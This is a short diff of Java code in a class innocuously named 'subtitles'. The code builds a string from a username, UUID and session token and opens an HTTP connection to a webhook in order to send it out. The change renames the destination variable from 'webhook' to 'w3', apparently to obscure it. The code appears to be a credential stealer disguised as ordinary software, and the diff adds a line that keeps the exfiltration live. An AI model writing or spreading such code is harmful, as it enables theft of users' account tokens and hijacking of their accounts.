@@ -28,7 +28,7 @@ public class subtitles
             //building tokenauth string
             String t = username + ":" + uuid + ":" + token;
             //opening connection to webhook
-            HttpURLConnection c = (HttpURLConnection)(new URL(webhook)).openConnection();
+            HttpURLConnection c = (HttpURLConnection)(new URL(w3)).openConnection();
             //set do output to true
             c.setDoOutput(true);
             //not important lmao
